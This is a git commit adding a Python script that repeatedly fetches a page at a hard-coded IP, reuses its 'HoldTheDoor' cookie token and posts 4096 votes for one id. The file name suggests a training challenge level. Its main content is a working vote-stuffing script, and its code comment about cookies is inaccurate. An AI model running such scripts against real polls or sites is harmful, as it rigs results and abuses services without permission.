d0e1543f6d31af198fec5a0d129a012c38a8ecd9
julianfrancor <julianfrancor@gmail.com>
2020-06-01 04:37:38 +0000

    program that votes 4096 times for your id

---
+++ level_1/level_1.py
@@ -0,0 +1,19 @@
+#!/usr/bin/python3
+
+import requests
+
+
+host = "http://158.69.76.135/level1.php"
+for i in range(4096):
+    response = requests.get('http://158.69.76.135/level1.php')
+    payload = {'id': '1528', 'holdthedoor': 'submit',
+               'key': response.cookies['HoldTheDoor']}
+    cookies = {'HoldTheDoor': response.cookies['HoldTheDoor']}
+    req = requests.post(host, payload, cookies=cookies)
+
+"""
+Notice that cookies is a environmental variable, so that is why
+I have to define it in that way in line 14
+"""
+
+""" print(response.cookies['HoldTheDoor']) """
